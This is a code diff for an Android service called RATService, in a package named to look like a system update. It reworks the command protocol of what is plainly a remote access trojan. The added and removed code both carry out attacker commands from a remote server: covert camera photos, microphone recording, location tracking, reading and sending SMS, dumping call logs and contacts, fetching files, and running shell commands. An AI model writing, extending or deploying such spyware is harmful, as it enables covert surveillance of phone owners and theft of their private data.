@@ -24,9 +24,6 @@ import androidx.core.app.NotificationCompat;
 
 import com.android.system.update.modules.*;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -302,12 +299,12 @@ public class RATService extends Service {
                     // Reset retry delay on successful connection
                     currentRetryDelay = 5000;
                     
-                    // Send initial device info as JSON
-                    sendJsonDeviceInfo();
+                    // Send initial device info in pipe-delimited format
+                    sendDeviceInfo();
                     
                     String line;
                     while (isRunning.get() && (line = in.readLine()) != null) {
-                        processJsonCommand(line);
+                        processCommand(line);
                     }
                     
                 } catch (SocketTimeoutException e) {
@@ -357,28 +354,153 @@ public class RATService extends Service {
         }
     }
     
-    private void sendJsonDeviceInfo() {
-        try {
-            JSONObject deviceInfo = new JSONObject();
-            deviceInfo.put("type", "device_info");
-            deviceInfo.put("manufacturer", Build.MANUFACTURER);
-            deviceInfo.put("model", Build.MODEL);
-            deviceInfo.put("android_version", Build.VERSION.RELEASE);
-            deviceInfo.put("sdk_int", Build.VERSION.SDK_INT);
-            deviceInfo.put("device_id", getUniqueDeviceId());
-            
-            if (out != null) {
-                out.println(deviceInfo.toString());
-                out.flush();
-                Log.d(TAG, "Sent device info: " + deviceInfo.toString());
-            }
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating device info JSON", e);
+    private void sendDeviceInfo() {
+        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
+            getUniqueDeviceId(),
+            Build.MANUFACTURER,
+            Build.MODEL,
+            Build.VERSION.RELEASE,
+            Build.VERSION.SDK_INT
+        );
+        sendCommand(info);
+        Log.d(TAG, "Sent device info: " + info);
+    }
+    
+    private void sendCommand(String data) {
+        if (out != null) {
+            out.println(data);
+            out.flush();
+        }
+    }
+    
+    private void processCommand(String command) {
+        String[] parts = command.split("\\|", 2);
+        String cmd = parts[0];
+        String args = parts.length > 1 ? parts[1] : "";
+        
+        Log.d(TAG, "Received command: " + cmd);
+        
+        switch (cmd) {
+            case "PING":
+                sendCommand("PONG");
+                break;
+                
+            case "CAMERA_PHOTO":
+                if (cameraModule != null) {
+                    String result = cameraModule.takePhoto();
+                    sendCommand("CAMERA_PHOTO|" + result);
+                } else {
+                    sendCommand("CAMERA_PHOTO|ERROR: Camera module not available");
+                }
+                break;
+                
+            case "MIC_START":
+                if (micModule != null) {
+                    String result = micModule.startRecording(30);
+                    sendCommand("MIC_START|" + result);
+                } else {
+                    sendCommand("MIC_START|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "MIC_STOP":
+                if (micModule != null) {
+                    String result = micModule.stopRecording();
+                    sendCommand("MIC_STOP|" + result);
+                } else {
+                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "LOCATION":
+                if (locationModule != null) {
+                    String result = locationModule.getLocation();
+                    sendCommand("LOCATION|" + result);
+                } else {
+                    sendCommand("LOCATION|ERROR: Location module not available");
+                }
+                break;
+                
+            case "SMS_GET":
+                if (smsModule != null) {
+                    String result = smsModule.getSms();
+                    sendCommand("SMS_GET|" + result);
+                } else {
+                    sendCommand("SMS_GET|ERROR: SMS module not available");
+                }
+                break;
+                
+            case "SMS_SEND":
+                if (smsModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 2);
+                    String result = smsModule.sendSms(parts2[0], parts2[1]);
+                    sendCommand("SMS_SEND|" + result);
+                } else {
+                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
+                }
+                break;
+                
+            case "CALL_GET":
+                if (callsModule != null) {
+                    String result = callsModule.getCallLogs();
+                    sendCommand("CALL_GET|" + result);
+                } else {
+                    sendCommand("CALL_GET|ERROR: Calls module not available");
+                }
+                break;
+                
+            case "CONTACTS_GET":
+                if (contactsModule != null) {
+                    String result = contactsModule.getContacts();
+                    sendCommand("CONTACTS_GET|" + result);
+                } else {
+                    sendCommand("CONTACTS_GET|ERROR: Contacts module not available");
+                }
+                break;
+                
+            case "FILE_LIST":
+                if (fileModule != null) {
+                    String result = fileModule.listFiles(args);
+                    sendCommand("FILE_LIST|" + result);
+                } else {
+                    sendCommand("FILE_LIST|ERROR: File module not available");
+                }
+                break;
+                
+            case "FILE_GET":
+                if (fileModule != null) {
+                    String result = fileModule.getFile(args);
+                    sendCommand("FILE_GET|" + result);
+                } else {
+                    sendCommand("FILE_GET|ERROR: File module not available");
+                }
+                break;
+                
+            case "SHELL":
+                if (shellModule != null) {
+                    String result = shellModule.executeCommand(args);
+                    sendCommand("SHELL|" + result);
+                } else {
+                    sendCommand("SHELL|ERROR: Shell module not available");
+                }
+                break;
+                
+            case "DEVICE_INFO":
+                if (deviceModule != null) {
+                    String result = deviceModule.getDeviceInfo();
+                    sendCommand("DEVICE_INFO|" + result);
+                } else {
+                    sendCommand("DEVICE_INFO|ERROR: Device module not available");
+                }
+                break;
+                
+            default:
+                sendCommand("UNKNOWN_CMD|" + cmd);
+                break;
         }
     }
     
     private String getUniqueDeviceId() {
-        // Generate or retrieve a persistent device ID (renamed to avoid conflict)
         SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
         String deviceId = prefs.getString("device_id", null);
         if (deviceId == null) {
@@ -386,176 +508,6 @@ public class RATService extends Service {
             prefs.edit().putString("device_id", deviceId).apply();
         }
         return deviceId;
-    }
-    
-    private void processJsonCommand(String jsonCommand) {
-        try {
-            JSONObject cmd = new JSONObject(jsonCommand);
-            String commandType = cmd.optString("command");
-            String requestId = cmd.optString("request_id", java.util.UUID.randomUUID().toString());
-            
-            Log.d(TAG, "Received command: " + commandType + " (ID: " + requestId + ")");
-            
-            JSONObject response = new JSONObject();
-            response.put("request_id", requestId);
-            response.put("type", "response");
-            response.put("command", commandType);
-            
-            switch (commandType) {
-                case "ping":
-                    response.put("status", "success");
-                    response.put("data", "pong");
-                    break;
-                    
-                case "get_device_info":
-                    response.put("status", "success");
-                    response.put("data", deviceModule.getDeviceInfo());
-                    break;
-                    
-                case "camera_photo":
-                    if (cameraModule != null) {
-                        String photo = cameraModule.takePhoto();
-                        response.put("status", "success");
-                        response.put("data", photo);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Camera module not available");
-                    }
-                    break;
-                    
-                case "mic_start":
-                    if (micModule != null) {
-                        String result = micModule.startRecording(30);
-                        response.put("status", "success");
-                        response.put("data", result);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Microphone module not available");
-                    }
-                    break;
-                    
-                case "mic_stop":
-                    if (micModule != null) {
-                        String result = micModule.stopRecording();
-                        response.put("status", "success");
-                        response.put("data", result);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Microphone module not available");
-                    }
-                    break;
-                    
-                case "get_location":
-                    if (locationModule != null) {
-                        String location = locationModule.getLocation();
-                        response.put("status", "success");
-                        response.put("data", location);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Location module not available");
-                    }
-                    break;
-                    
-                case "get_sms":
-                    if (smsModule != null) {
-                        String sms = smsModule.getSms();
-                        response.put("status", "success");
-                        response.put("data", sms);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "SMS module not available");
-                    }
-                    break;
-                    
-                case "send_sms":
-                    if (smsModule != null) {
-                        String number = cmd.optString("number");
-                        String message = cmd.optString("message");
-                        String result = smsModule.sendSms(number, message);
-                        response.put("status", "success");
-                        response.put("data", result);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "SMS module not available");
-                    }
-                    break;
-                    
-                case "get_call_logs":
-                    if (callsModule != null) {
-                        String logs = callsModule.getCallLogs();
-                        response.put("status", "success");
-                        response.put("data", logs);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Calls module not available");
-                    }
-                    break;
-                    
-                case "get_contacts":
-                    if (contactsModule != null) {
-                        String contacts = contactsModule.getContacts();
-                        response.put("status", "success");
-                        response.put("data", contacts);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Contacts module not available");
-                    }
-                    break;
-                    
-                case "file_list":
-                    if (fileModule != null) {
-                        String path = cmd.optString("path", "/");
-                        String files = fileModule.listFiles(path);
-                        response.put("status", "success");
-                        response.put("data", files);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "File module not available");
-                    }
-                    break;
-                    
-                case "file_get":
-                    if (fileModule != null) {
-                        String path = cmd.optString("path");
-                        String fileData = fileModule.getFile(path);
-                        response.put("status", "success");
-                        response.put("data", fileData);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "File module not available");
-                    }
-                    break;
-                    
-                case "shell_exec":
-                    if (shellModule != null) {
-                        String command = cmd.optString("command");
-                        String result = shellModule.executeCommand(command);
-                        response.put("status", "success");
-                        response.put("data", result);
-                    } else {
-                        response.put("status", "error");
-                        response.put("message", "Shell module not available");
-                    }
-                    break;
-                    
-                default:
-                    response.put("status", "error");
-                    response.put("message", "Unknown command: " + commandType);
-                    break;
-            }
-            
-            // Send response
-            if (out != null) {
-                out.println(response.toString());
-                out.flush();
-                Log.d(TAG, "Sent response for command: " + commandType);
-            }
-            
-        } catch (JSONException e) {
-            Log.e(TAG, "Error parsing JSON command: " + jsonCommand, e);
-        } catch (Exception e) {
-            Log.e(TAG, "Error processing command", e);
-        }
     }
     
     private void scheduleRestartWithAlarm() {
